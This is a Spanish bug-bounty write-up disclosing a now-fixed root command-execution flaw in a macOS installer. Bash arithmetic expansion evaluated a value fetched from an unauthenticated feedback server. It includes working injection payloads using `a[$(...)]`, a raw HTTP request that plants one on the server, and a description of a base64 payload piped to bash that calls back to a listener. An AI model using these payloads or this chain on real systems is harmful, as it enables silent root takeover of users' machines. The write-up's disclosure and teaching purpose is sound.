---
title:       "RCE como root en un instalador de macOS: la aritmética de bash ejecuta lo que le metas"
summary:     "Un script de instalación sumaba uno a un número que venía del servidor. El problema es que en bash «sumar» significa «evaluar», y ese número lo podía escribir cualquiera por internet sin tener cuenta. Reporte aceptado y recompensado."
date:        2026-08-10 18:40:00 +0100
lang:        es
ref:         rce-instalador-macos-aritmetica
image:       /assets/img/og/rce-instalador-macos-aritmetica-es.png

severity:    high
cvss:        "8.8"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
cwe:         "CWE-78 · CWE-306"
vuln_class:  "Inyección"
target_type: "Instalador de escritorio (macOS)"
platform:    "YesWeHack"
status:      "Corregido"
reward:      "Recompensado"
tags:        [rce, macos, bash, instalador, root, inyeccion-de-comandos]

takeaways:
  - "En bash, `$(( ))` y `[[ … -ge … ]]` **evalúan** su contenido. No son comparaciones inocentes: son un intérprete abierto."
  - "Entrecomillar una variable no te salva dentro de un contexto aritmético. Lo único que vale es validar que de verdad es un número."
  - "Los instaladores de escritorio corren como root y casi nadie los mira. Son superficie de ataque de primera, y suelen estar a un `curl` de distancia."
  - "Si un script pide datos a un servidor, pregúntate siempre quién puede escribir en ese servidor."
---

Un `.pkg` de macOS puede ejecutar dos scripts al instalarse, `preinstall` y `postinstall`,
y si el paquete lo pide se ejecutan **como root**. Un instalador es además un fichero
público: te lo descargas y lees el código que va a correr con permisos totales en el
ordenador de miles de personas.

```bash
pkgutil --expand-full instalador.pkg /tmp/abierto
cat /tmp/abierto/*.pkg/Scripts/postinstall
```

## La línea

```bash
# prepare data for feedback server
new_installation_count=$((install_count + 1))
```

Una suma. Pero `$(( ))` en bash no suma: **evalúa**. Y evaluar incluye ejecutar lo que
encuentre dentro, porque permite índices de array y para resolver el índice tiene que
mirar lo que hay en los corchetes:

```bash
numero='a[$(touch /tmp/me-han-colado)]'
echo $((numero + 1))      # 1  (el índice vacío vale 0, más uno)
ls /tmp/me-han-colado     # el fichero existe
```

<div class="warn" markdown="1">
**Las comillas no protegen aquí.** `echo $(( "$numero" + 1 ))` se ejecuta igual:
entrecomillar evita que el shell parta la variable, no que la evalúe. Lo mismo con
`[[ "$x" -ge 10 ]]`. Con corchete simple —el `test` de POSIX— no pasa: da «se esperaba un
entero» y no ejecuta nada.
</div>

## De dónde salía el número

Seguí la variable hacia atrás:

```bash
curl_data=$(curl -s "https://feedback.ejemplo.tld/v2/feedback/${install_id}?plain=1")

while IFS=':' read -r name value; do
    case "$name" in
        *installCount*) install_count="${value//\"/}" ;;
    esac
done <<< "$curl_data"
```

Lo decide el servidor. Así que la pregunta pasa a ser quién puede escribir en ese servidor.

## Cualquiera

Sin cuenta, sin token:

```http
POST /v2/feedback?plain=1 HTTP/2
Host: feedback.ejemplo.tld
Content-Type: application/json

{"clickId":"<mi-id-canario>",
 "clickData":{"custom":{"installCount":"a[$(id > /tmp/canario_root)]"}}}
```

```http
HTTP/2 200 OK
```

Y al leerlo de vuelta volvía byte a byte, sin filtrar nada.

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/02-payload-en-el-servidor.png' | relative_url }}"
       alt="Terminal: al consultar el registro guardado, el campo installationCounter contiene a[$(echo ...base64... | openssl base64 -d -A | bash)]">
  <figcaption>El valor, ya guardado en el servidor y leído de vuelta. Donde debería haber un número hay una sustitución de orden: <code>a[$(…)]</code>. Lo que va en base64 es un <code>id</code> y una llamada a mi propio servidor.</figcaption>
</figure>

Faltaba el `install_id` de la víctima, y tampoco era un secreto: el script lo saca del
nombre del fichero descargado y de los metadatos que macOS le pone.

```bash
mdls -name kMDItemWhereFroms instalador_<install_id>.pkg
```

Viaja pegado al instalador. Quien comparta el suyo por un chat o un enlace de afiliado
está compartiendo el identificador.

## La cadena

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/03-cadena.svg' | relative_url }}"
       alt="Diagrama: el atacante escribe sin autenticación en el servidor de feedback, la víctima instala, el script descarga el valor y lo evalúa como root">
  <figcaption>Nadie valida nada en todo el recorrido. El valor entra como texto y sale como orden.</figcaption>
</figure>

1. El atacante escribe el valor en el servidor de feedback. **Sin cuenta.**
2. La víctima instala o reinstala.
3. El `postinstall`, **como root**, se descarga ese valor.
4. El parseo lo mete en una variable quitándole solo las comillas.
5. `$((install_count + 1))` lo evalúa.

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/03-bash-evalua.png' | relative_url }}"
       alt="Terminal de macOS: se expande el paquete firmado, se ejecuta su postinstall con sudo, y bash falla con «syntax error: operand expected» al intentar evaluar como aritmetica el contenido descargado del servidor">
  <figcaption>El <code>postinstall</code> del paquete firmado, corriendo como root. Bash se queja de <code>syntax error: operand expected</code> intentando <strong>evaluar</strong> lo que acaba de descargarse: la prueba de que ese valor entra en <code>$(( ))</code>.</figcaption>
</figure>

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/01-callback.png' | relative_url }}"
       alt="Oyente fuera de banda recibiendo dos llamadas desde la maquina donde se instalo: una interaccion DNS y, un segundo despues, una peticion HTTP POST. Las direcciones IP de origen van tapadas">
  <figcaption>Un segundo después de instalar, la máquina llama a mi oyente: primero resuelve el dominio y luego hace el <code>POST</code>. El código se ejecutó. Las IP de origen son mías y van tapadas.</figcaption>
</figure>

## Y la víctima no ve nada

```bash
# always exit with code 0 to not show any error in the installer
trap finish EXIT
finish() { exit 0; }
```

El script dice siempre que todo ha ido bien. Si mi orden revienta la instalación a mitad,
el instalador sigue mostrando la marca verde. Tampoco usaba `set -u` ni `set -e`.

## Impacto

<div class="impact" markdown="1">
**Impacto.** Ejecución de comandos arbitrarios **como root** en el Mac de la víctima al
instalar o reinstalar. Control total del equipo: lectura de cualquier fichero, instalación
de persistencia, robo de credenciales. Sin cuenta por parte del atacante y sin un solo
indicio visible para la víctima, que ve una instalación terminada con éxito.
</div>
